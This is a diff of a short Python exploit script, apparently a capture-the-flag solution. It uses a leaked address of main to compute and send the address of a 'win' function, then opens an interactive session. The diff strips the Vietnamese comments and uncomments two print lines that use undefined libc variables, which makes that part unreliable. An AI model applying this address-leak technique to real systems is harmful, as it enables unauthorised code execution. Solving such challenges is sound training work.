@@ -29,19 +29,15 @@ def GDB():
 line = ru(b'Address of main: ').decode() + r(14).decode()
 main_addr = int(line.split(": ")[1].strip(), 16)
 print(hex(main_addr))
-win_offset = 0x12a7  # Địa chỉ win trong file ELF
-main_offset = 0x133d  # Địa chỉ main trong file ELF
+win_offset = 0x12a7 
+main_offset = 0x133d 
 
-# Tính địa chỉ thực của win dựa vào địa chỉ đã leak của main
 win_addr = main_addr - (main_offset - win_offset)
 payload = hex(win_addr) 
 
-print(payload) # Ghi đè return address bằng địa chỉ win thực sự
+print(payload)
 sla(b'0x12345: ', payload)
 
-#info('[*] libc leak: ' + hex(libc_leak))
-#info('[*] libc base: ' + hex(libc.address))
-
-
-
+info('[*] libc leak: ' + hex(libc_leak))
+info('[*] libc base: ' + hex(libc.address))
 p.interactive()
